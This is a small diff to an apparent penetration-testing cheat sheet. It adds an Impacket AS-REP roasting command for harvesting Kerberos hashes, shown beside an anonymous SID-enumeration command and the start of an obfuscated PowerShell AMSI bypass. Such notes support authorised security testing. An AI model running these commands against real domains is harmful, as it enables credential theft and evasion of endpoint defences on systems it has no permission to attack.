@@ -42,6 +42,11 @@ docker run -it --rm -v ~/Desktop/share:/shared impacket:latest
 impacket-lookupsid anonymous@10.10.10.10
 ```
 
+// Impacket - ASREProast
+```
+impacket-GetNPUsers contoso.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
+```
+
 // AMSI bypass - https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/  
 ```
 $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
